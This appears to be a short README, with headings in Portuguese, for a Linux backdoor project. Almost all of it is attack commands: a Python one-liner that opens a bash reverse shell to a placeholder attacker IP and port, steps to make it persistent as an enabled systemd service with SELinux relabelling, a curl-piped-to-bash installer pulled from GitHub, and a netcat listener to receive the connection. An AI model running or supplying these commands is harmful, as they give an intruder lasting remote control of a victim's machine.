# Backdoor

#### Script
> import os ; os.system('bash -i >& /dev/tcp/[IP DE DESTINO]/[PORTA DE DESTINO] 0>&1')

#### Configurações de Selinux
restorecon -RFv /usr/lib/systemd/system/backdoor.service

#### Configurações de Systemd
cp backdoor.service /usr/lib/systemd/system/
systemctl daemon-reload
systemctl start backdoor.service
systemctl enable backdoor.service

#### Instalação
curl -s -L https://raw.githubusercontent.com/laurobmb/backdoor_linux/master/install.sh | bash

#### No server
Para receber a conexão basta executar:

> nc -nlv 8001